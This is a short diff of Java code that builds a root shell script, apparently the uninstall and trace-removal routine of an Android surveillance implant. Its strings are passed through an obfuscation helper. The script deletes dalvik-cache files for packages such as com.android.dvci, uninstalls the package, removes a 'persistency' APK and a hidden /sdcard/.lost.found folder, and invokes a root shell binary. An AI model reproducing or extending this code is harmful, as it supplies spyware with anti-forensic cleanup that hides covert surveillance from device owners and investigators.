@@ -316,10 +316,14 @@ public class Root {
 				}
 			}
 
+			// TODO: mettere Status.persistencyApk e packageName
+			script += M.e("for i in `ls /data/dalvik-cache/com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+			script += M.e("for i in `ls /data/dalvik-cache/StkDevice* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
+
 			script += M.e("pm clear ") + packageName + "\n";
 			script += M.e("pm disable ") + packageName + "\n";
 			script += M.e("pm uninstall ") + packageName + "\n";
-			script += M.e("pm enable ") + packageName + "\n";
+			//script += M.e("pm enable ") + packageName + "\n";
 				/* todo: do it manually? without pm intervention
 				 * 1) edit /data/system/packages.xml
 				 * 2) edit /data/system/packages.list
@@ -329,10 +333,6 @@ public class Root {
 
 			script += String.format(M.e(" [ -e %s ] && rm %s"), Status.persistencyApk, Status.persistencyApk) + "\n";
 			script += String.format(M.e(" [ -e %s ] && rm -r %s"), M.e("/sdcard/.lost.found"), M.e("/sdcard/.lost.found")) + "\n";
-
-			// TODO: mettere Status.persistencyApk e packageName
-			script += M.e("for i in `ls /data/dalvik-cache/com.android.dvci* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
-			script += M.e("for i in `ls /data/dalvik-cache/StkDevice* 2>/dev/null`; do [ -e $i ] && rm  $i; done") + "\n";
 
 			script += Configuration.shellFile + M.e(" blr") + "\n";
 			script += Configuration.shellFile + M.e(" ru") + "\n";
